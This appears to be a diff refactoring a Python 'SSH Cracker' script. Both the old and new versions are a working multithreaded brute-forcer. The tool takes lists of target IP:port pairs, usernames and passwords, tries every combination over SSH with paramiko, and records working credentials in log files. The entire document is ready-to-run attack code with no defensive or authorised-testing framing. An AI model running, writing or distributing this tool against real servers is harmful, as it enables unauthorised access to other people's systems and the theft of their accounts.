@@ -1,176 +1,170 @@
 import os
 import sys
-import logging
-from threading import Lock, Thread
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import paramiko
 import time
+from threading import Lock, Thread
 from queue import Queue
-from colorama import Fore, Style, init
+from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
+from pystyle import Colors, Colorate, Center
+from contextlib import suppress
+from logging import CRITICAL, basicConfig
 
-init()
 
-banner = '''
- ____      _        ____                _
-/ ___| ___| |__    / ___|_ __ __ _  ___| | _____ _ __
-\___ \/ __| '_ \  | |   | '__/ _` |/ __| |/ / _ \ '__|
- ___) \__ \ | | | | |___| | | (_| | (__|   <  __/ |
-|____/|___/_| |_|  \____|_|  \__,_|\___|_|\_\___|_|
-                @secabuser \n'''
-g = Fore.GREEN
-r = Fore.RED
-y = Fore.YELLOW
-w = Fore.WHITE
-
-logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+basicConfig(level=CRITICAL)
 sys.stderr = open(os.devnull, 'w')
 lock = Lock()
 
-log_queue = Queue()
+class Counter:
+    def __init__(self, value=0):
+        self.value = value
+        self.lock = Lock()
 
-def async_log_writer():
-    while True:
-        filename, message = log_queue.get()
-        if filename is None:
-            break
-        with open(filename, 'a') as file:
-            file.write(message + '\n')
-        log_queue.task_done()
+    def increment(self):
+        with self.lock:
+            self.value += 1
 
-def write_to_log(filename, message):
-    log_queue.put((filename, message))
+    def get(self):
+        with self.lock:
+            return self.value
 
-def clear_log_file(filename):
-    with open(filename, 'w') as file:
-        file.write("")
+class Logger:
+    @staticmethod
+    def success(message):
+        print(Colorate.Horizontal(Colors.green_to_white, f"[SUCCESS] {message}"))
+
+    @staticmethod
+    def error(message):
+        print(Colorate.Horizontal(Colors.red_to_white, f"[ERROR] {message}"))
+
+    @staticmethod
+    def warning(message):
+        print(Colorate.Horizontal(Colors.yellow_to_white, f"[WARNING] {message}"))
+
+    @staticmethod
+    def info(message):
+        print(Colorate.Horizontal(Colors.blue_to_white, f"[INFO] {message}"))
+
+class SSHCracker:
+    def __init__(self, ip_file, user_file, pass_file, threads, timeout=10):
+        self.ip_file = ip_file
+        self.user_file = user_file
+        self.pass_file = pass_file
+        self.timeout = timeout
+        self.threads = threads
+        self.queue = Queue()
+        self.success_log = "good.txt"
+        self.error_log = "error.txt"
+        self.no_access_log = "no-access.txt"
+        self.success_count = Counter(0)
+        self.error_count = Counter(0)
+        self.checked_count = Counter(0)
+
+    def load_data(self, file_path):
+        if not os.path.isfile(file_path):
+            Logger.error(f"File '{file_path}' not found.")
+            sys.exit(1)
+        
+        with open(file_path, "r") as file:
+            return [line.strip() for line in file if line.strip()]
+
+    def write_log(self, filename, message):
+        with lock:
+            with open(filename, "a") as f:
+                f.write(message + "\n")
+
+    def ssh_connect(self, ip, port, username, password):
+        try:
+            client = SSHClient()
+            client.set_missing_host_key_policy(AutoAddPolicy())
+            client.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
+            success_msg = f"{ip}:{port} - User: {username}, Password: {password}"
+            Logger.success(success_msg)
+            self.write_log(self.success_log, success_msg)
+            self.success_count.increment()
+        except AuthenticationException:
+            error_msg = f"{ip}:{port} - Invalid credentials (User: {username}, Password: {password})"
+            Logger.error(error_msg)
+            self.write_log(self.error_log, error_msg)
+            self.error_count.increment()
+        except Exception as e:
+            warning_msg = f"{ip}:{port} - {e}"
+            Logger.warning(warning_msg)
+            self.write_log(self.no_access_log, warning_msg)
+            self.error_count.increment()
+        finally:
+            self.checked_count.increment()
+            if 'client' in locals():
+                client.close()
+
+    def worker(self, user_list, pass_list):
+        while not self.queue.empty():
+            ip, port = self.queue.get()
+            for username in user_list:
+                for password in pass_list:
+                    self.ssh_connect(ip, port, username, password)
+            self.queue.task_done()
+
+    def start(self):
+
+        Logger.info("Start Cracking . .")
+        time.sleep(0.1)
+
+        for log_file in [self.success_log, self.error_log, self.no_access_log]:
+            with open(log_file, "w"):
+                pass
+
+        ip_list = self.load_data(self.ip_file)
+        user_list = self.load_data(self.user_file)
+        pass_list = self.load_data(self.pass_file)
+
+        for line in ip_list:
+            if ":" in line:
+                ip, port = line.split(":")
+                self.queue.put((ip.strip(), int(port.strip())))
+            else:
+                Logger.warning(f"Invalid format in IP file: {line}")
+
+        threads = []
+        for _ in range(self.threads):
+            thread = Thread(target=self.worker, args=(user_list, pass_list))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+        Logger.info(f"SSH Cracking Complete!")
+        print(f"\n{Colors.green}Summary:{Colors.reset} Success: {self.success_count.get()}, Errors: {self.error_count.get()}, Total Checked: {self.checked_count.get()}")
 
 def clear_console():
+    
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def ssh_test_single(ip, port, username, password, timeout, success_log, error_log, no_access_log):
-    global good, bad, all_check, ips_checked
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip, port=int(port), username=username, password=password, timeout=timeout)
-        
-        stdin, stdout, stderr = client.exec_command('ls')
-        exit_status = stdout.channel.recv_exit_status()
-        
-        if exit_status == 0:
-            success_message = f"{ip}:{port} | {username} | {password}"
-            write_to_log(success_log, success_message)
-            with lock:
-                good += 1
-        else:
-            no_access_message = f"{ip}:{port} | {username} | {password}"
-            write_to_log(no_access_log, no_access_message)
-            with lock:
-                bad += 1
-    except paramiko.AuthenticationException:
-        error_message = f"{ip}:{port} | {username} | {password}"
-        write_to_log(error_log, error_message)
-        with lock:
-            bad += 1
-    except Exception as e:
-        error_message = f"{ip}:{port}: {e} | {username} | {password}"
-        write_to_log(error_log, error_message)
-        with lock:
-            bad += 1
-    finally:
-        with lock:
-            all_check += 1
-            ips_checked += 1
-        if 'client' in locals():
-            client.close()
-
-def ssh_test_multithreaded():
-    global good, bad, all_check, ips_checked
-    good, bad, all_check, ips_checked = 0, 0, 0, 0
-
-    log_thread = Thread(target=async_log_writer, daemon=True)
-    log_thread.start()
-
-    clear_console()
-    print(f"{g}{banner}{w}")
-
-    ip_file = input(f"{g}[~]──╼ {w}Enter the path to the IP file > ")
-    username_file = input(f"{g}[~]──╼ {w}Enter the path to the username file > ")
-    password_file = input(f"{g}[~]──╼ {w}Enter the path to the password file > ")
-    timeout = int(input(f"{g}[~]──╼ {w}Enter the SSH timeout (seconds) > "))
-    max_workers = int(input(f"{g}[~]──╼ {w}Enter the maximum number of threads > "))
-
-    if not os.path.isfile(ip_file) or not os.path.isfile(username_file) or not os.path.isfile(password_file):
-        print(f"{r}[!] Error: One or more input files not found.{w}")
-        return
-
-    try:
-        with open(ip_file, 'r') as file:
-            ip_list = [line.strip() for line in file if line.strip()]
-    except Exception as e:
-        print(f"{r}[!] Failed to read IP file: {e}{w}")
-        return
-
-    try:
-        with open(username_file, 'r') as file:
-            usernames = [line.strip() for line in file if line.strip()]
-    except Exception as e:
-        print(f"{r}[!] Failed to read username file: {e}{w}")
-        return
-
-    try:
-        with open(password_file, 'r') as file:
-            passwords = [line.strip() for line in file if line.strip()]
-    except Exception as e:
-        print(f"{r}[!] Failed to read password file: {e}{w}")
-        return
-
-    total_requests = len(ip_list)
-
-    success_log = "success_log.txt"
-    error_log = "error_log.txt"
-    no_access_log = "no_access_log.txt"
-
-    clear_log_file(success_log)
-    clear_log_file(error_log)
-    clear_log_file(no_access_log)
-
-    def task(ip_line, username, password):
-        try:
-            ip, port = ip_line.split(":")
-        except ValueError:
-            error_message = f"{r}[!] Invalid format in line: {ip_line}{w}"
-            write_to_log(error_log, error_message)
-            with lock:
-                bad += 1
-            return
-
-        ssh_test_single(ip, port, username, password, timeout, success_log, error_log, no_access_log)
-
-    start_time = time.time()
-
-    try:
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            futures = []
-            for ip_line in ip_list:
-                for username in usernames:
-                    for password in passwords:
-                        futures.append(executor.submit(task, ip_line, username, password))
-            for future in as_completed(futures):
-                future.result()
-                elapsed_time = time.time() - start_time
-                ips_per_second = int(ips_checked / (elapsed_time + 1e-6))
-                os.system('cls' if os.name == 'nt' else 'clear')
-                print(banner)
-                print(f"{g}Good: {good} | {r}Bad: {bad} | {y}All: {all_check}/{total_requests} | {w}IPs/s: {ips_per_second}", end='\r')
-    finally:
-        log_queue.put((None, None))
-        log_thread.join()
-
-    print(f"\n{g}[!] Scan completed.{w}")
-    print(f"{g}[!] Success log: {success_log}{w}")
-    print(f"{r}[!] Error log: {error_log}{w}")
-    print(f"{y}[!] No Access log: {no_access_log}{w}")
-
 if __name__ == "__main__":
-    ssh_test_multithreaded()
+
+    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""
+███████ ███████ ██   ██      ██████ ██████   █████   ██████ ██   ██ ███████ ██████  
+██      ██      ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+███████ ███████ ███████     ██      ██████  ███████ ██      █████   █████   ██████  
+     ██      ██ ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+███████ ███████ ██   ██      ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ 
+    """)))
+
+    with suppress(KeyboardInterrupt):
+        os.system('cls' if os.name == 'nt' else 'clear')
+        ip_file = input(Colors.red + "IP file (e.g., ips.txt): " + Colors.reset).strip()
+        user_file = input(Colors.red + "Username file (e.g., users.txt): " + Colors.reset).strip()
+        pass_file = input(Colors.red + "Password file (e.g., passwords.txt): " + Colors.reset).strip()
+        threads = int(input(Colors.red + "Number of threads: " + Colors.reset).strip())
+
+        clear_console()
+        print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""
+███████ ███████ ██   ██      ██████ ██████   █████   ██████ ██   ██ ███████ ██████  
+██      ██      ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+███████ ███████ ███████     ██      ██████  ███████ ██      █████   █████   ██████  
+     ██      ██ ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+███████ ███████ ██   ██      ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ 
+                                                                                    
+        """)))
+
+        cracker = SSHCracker(ip_file, user_file, pass_file, threads)
+        cracker.start()
